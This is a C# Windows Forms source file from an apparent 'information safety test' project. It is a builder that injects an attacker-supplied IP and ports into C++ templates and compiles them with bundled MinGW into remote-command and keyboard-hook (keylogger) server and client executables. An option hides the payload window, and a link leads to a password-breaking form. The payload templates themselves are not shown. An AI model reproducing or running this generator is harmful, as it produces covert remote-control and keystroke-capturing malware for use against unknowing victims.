using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics; 
namespace Information_Safty_Test
{
    public partial class Remote_Control_Form : Form
    {
        public Remote_Control_Form()
        {
            InitializeComponent();
        }

        private void R_R_Button_Click(object sender, EventArgs e)
        {
            
            Remote_Control_Form RCF = new Remote_Control_Form();
            RCF.Show();
            this.Hide();
            this.Close();
        }
        public void CMD_Get(string str)
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = false;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardInput.WriteLine(str);
            p.StandardInput.AutoFlush = true;
            p.WaitForExit();
            p.Close();
        }
        private void Server_Button_Click(object sender, EventArgs e)
        {
            if (IP_textBox.Text == "" || Port_textBox.Text == "" || PORT2_textBox.Text=="")
                MessageBox.Show("请输入完整信息", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            else
            {
                try
                {
                    StreamReader Cfile = new StreamReader(".\\Socket\\main.cpp", Encoding.Default);
                    String Code = "";
                    String temp;
                    while ((temp = Cfile.ReadLine()) != null)
                    {
                        temp += "\r\n";
                        Code += temp;
                    }

                    Cfile.Close();
                    int Port_num = Code.IndexOf("#define PORT1");
                    Code = Code.Insert(Port_num + "#define PORT1 ".Length, Port_textBox.Text);
                    int Port2_num = Code.IndexOf("#define PORT2");
                    Code = Code.Insert(Port2_num + "#define PORT2 ".Length, PORT2_textBox.Text);
                    int IP_num = Code.IndexOf("#define IP");
                    if(IP_textBox.Text.IndexOf("\"")==-1)
                        IP_textBox.Text = " \"" + IP_textBox.Text + "\"";
                    Code = Code.Insert(IP_num + "#define IP ".Length, IP_textBox.Text);
                    FileStream fs = new FileStream(".\\Socket\\Socket_Cmd.cpp", FileMode.Create);
                    StreamWriter sw = new StreamWriter(fs);
                    sw.Write(Code);
                    sw.Flush();
                    sw.Close();
                    fs.Close();
                    SaveFileDialog sfd = new SaveFileDialog();
                    sfd.Title = "服务端保存路径";
                    sfd.InitialDirectory = "C:\\";
                    sfd.Filter = "EXE文件|*.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        //sfd.FileName=sfd.FileName.Replace(@"\", @"\\");
                        if (Hide_Button.Checked == false)
                        {
                            CMD_Get(@".\Socket\MinGW\bin\mingw32-g++.exe   -c .\Socket\Socket_Cmd.cpp -o .\Socket\Socket_Cmd.o" + "&&exit");
                            CMD_Get(".\\Socket\\MinGW\\bin\\mingw32-g++.exe  -o " + sfd.FileName + " .\\Socket\\Socket_Cmd.o \".\\Socket\\WS2_32.Lib\"" + "&&exit");
                        }
                        else
                        {
                            CMD_Get(@".\Socket\MinGW\bin\mingw32-g++.exe -Wall -fexceptions -g  -c .\socket\Socket_Cmd.cpp -o .\Socket\Socket_Cmd2.o" + "&&exit");
                            CMD_Get(".\\Socket\\MinGW\\bin\\mingw32-g++.exe  -o " + sfd.FileName + " .\\Socket\\Socket_Cmd2.o   \".\\Socket\\WS2_32.Lib\" -mwindows" + "&&exit");
                        }
                        MessageBox.Show("生成成功!文件位置:" + sfd.FileName);

                    }
                }
                catch
                {
                    MessageBox.Show("生成过程中出错！");
                }
               
            }
   
        }

        private void Client_Button_Click(object sender, EventArgs e)
        {
            if (IP_textBox.Text == "" || Port_textBox.Text == "" || PORT2_textBox.Text == "")
                MessageBox.Show("请输入完整信息", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            else
            {
                try
                {
                    StreamReader Cfile = new StreamReader(".\\Socket\\main2.cpp", Encoding.Default);
                    String Code = "";
                    String temp;
                    while ((temp = Cfile.ReadLine()) != null)
                    {
                        temp += "\r\n";
                        Code += temp;
                    }

                    Cfile.Close();
                    int Port_num = Code.IndexOf("#define PORT1");
                    Code = Code.Insert(Port_num + "#define PORT1 ".Length, Port_textBox.Text);
                    int Port2_num = Code.IndexOf("#define PORT2");
                    Code = Code.Insert(Port2_num + "#define PORT2 ".Length, PORT2_textBox.Text);
                    FileStream fs = new FileStream(".\\Socket\\Socket_Click.cpp", FileMode.Create);
                    StreamWriter sw = new StreamWriter(fs);
                    sw.Write(Code);
                    sw.Flush();
                    sw.Close();
                    fs.Close();
                    SaveFileDialog sfd = new SaveFileDialog();
                    sfd.Title = "客户端保存路径";
                    sfd.InitialDirectory = "C:\\";
                    sfd.Filter = "EXE文件|*.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        //sfd.FileName=sfd.FileName.Replace(@"\", @"\\");
                        CMD_Get(@".\Socket\MinGW\bin\mingw32-g++.exe   -c .\Socket\Socket_Click.cpp -o .\Socket\Socket_Click.o" + "&&exit");
                        CMD_Get(".\\Socket\\MinGW\\bin\\mingw32-g++.exe  -o " + sfd.FileName + " .\\Socket\\Socket_Click.o \".\\Socket\\WS2_32.Lib\"" + "&&exit");
                        MessageBox.Show("生成成功!文件位置:"+sfd.FileName);
                    }
                }
               catch
                {
                    MessageBox.Show("生成过程中出错!");
                }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            
            PassW_Break RCF = new PassW_Break();
            
            RCF.Show();
            this.Hide();
            this.Close();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            
            Form1 RCF = new Form1();
            RCF.Show();
            this.Hide();
            this.Close();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (IP_textBox.Text == "" || Port_textBox.Text == "" || PORT2_textBox.Text == "")
                MessageBox.Show("请输入完整信息", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            else
            {
                try
                {
                    StreamReader Cfile = new StreamReader(".\\Socket\\main3.cpp", Encoding.Default);
                    String Code = "";
                    String temp;
                    while ((temp = Cfile.ReadLine()) != null)
                    {
                        temp += "\r\n";
                        Code += temp;
                    }

                    Cfile.Close();
                    int Port2_num = Code.IndexOf("#define PORT1");
                    Code = Code.Insert(Port2_num + "#define PORT1 ".Length, Port_textBox.Text);
                    FileStream fs = new FileStream(".\\Socket\\HOOK_CMD.cpp", FileMode.Create);
                    StreamWriter sw = new StreamWriter(fs);
                    sw.Write(Code);
                    sw.Flush();
                    sw.Close();
                    fs.Close();
                    SaveFileDialog sfd = new SaveFileDialog();
                    sfd.Title = "键盘监听服务端保存路径";
                    sfd.InitialDirectory = "C:\\";
                    sfd.Filter = "EXE文件|*.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        //sfd.FileName=sfd.FileName.Replace(@"\", @"\\");
                        if (Hide_Button.Checked == false)
                        {
                            CMD_Get(@".\Socket\MinGW\bin\mingw32-g++.exe   -c .\Socket\HOOK_CMD.cpp -o .\Socket\HOOK_CMD.o" + "&&exit");
                            CMD_Get(".\\Socket\\MinGW\\bin\\mingw32-g++.exe  -o " + sfd.FileName + " .\\Socket\\HOOK_CMD.o \".\\Socket\\WS2_32.Lib\"" + "&&exit");
                        }
                        else
                        {
                            CMD_Get(@".\Socket\MinGW\bin\mingw32-g++.exe -Wall -fexceptions -g  -c .\socket\HOOK_CMD.cpp -o .\Socket\HOOK_CMD2.o" + "&&exit");
                            CMD_Get(".\\Socket\\MinGW\\bin\\mingw32-g++.exe  -o " + sfd.FileName + " .\\Socket\\HOOK_CMD2.o   \".\\Socket\\WS2_32.Lib\" -mwindows" + "&&exit");
                        }
                        MessageBox.Show("生成成功!文件位置:" + sfd.FileName);
                    }
                }
                catch
                {
                    MessageBox.Show("生成过程中出错!");
                }
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (IP_textBox.Text == "" || Port_textBox.Text == "" || PORT2_textBox.Text == "")
                MessageBox.Show("请输入完整信息", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            else
            {
                try
                {
                    StreamReader Cfile = new StreamReader(".\\Socket\\main4.cpp", Encoding.Default);
                    String Code = "";
                    String temp;
                    while ((temp = Cfile.ReadLine()) != null)
                    {
                        temp += "\r\n";
                        Code += temp;
                    }

                    Cfile.Close();
                    int Port2_num = Code.IndexOf("#define PORT1");
                    Code = Code.Insert(Port2_num + "#define PORT1 ".Length, Port_textBox.Text);
                    FileStream fs = new FileStream(".\\Socket\\HOOK_CLIENT.cpp", FileMode.Create);
                    StreamWriter sw = new StreamWriter(fs);
                    sw.Write(Code);
                    sw.Flush();
                    sw.Close();
                    fs.Close();
                    SaveFileDialog sfd = new SaveFileDialog();
                    sfd.Title = "键盘监听客户端保存路径";
                    sfd.InitialDirectory = "C:\\";
                    sfd.Filter = "EXE文件|*.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        //sfd.FileName=sfd.FileName.Replace(@"\", @"\\");
                        CMD_Get(@".\Socket\MinGW\bin\mingw32-g++.exe   -c .\Socket\HOOK_CLIENT.cpp -o .\Socket\HOOK_CLIENT.o" + "&&exit");
                        CMD_Get(".\\Socket\\MinGW\\bin\\mingw32-g++.exe  -o " + sfd.FileName + " .\\Socket\\HOOK_CLIENT.o \".\\Socket\\WS2_32.Lib\"" + "&&exit");
                        MessageBox.Show("生成成功!文件位置:" + sfd.FileName);
                    }
                }
                catch
                {
                    MessageBox.Show("生成过程中出错!");
                }
                
            }
        }
        

       
      
    }
}
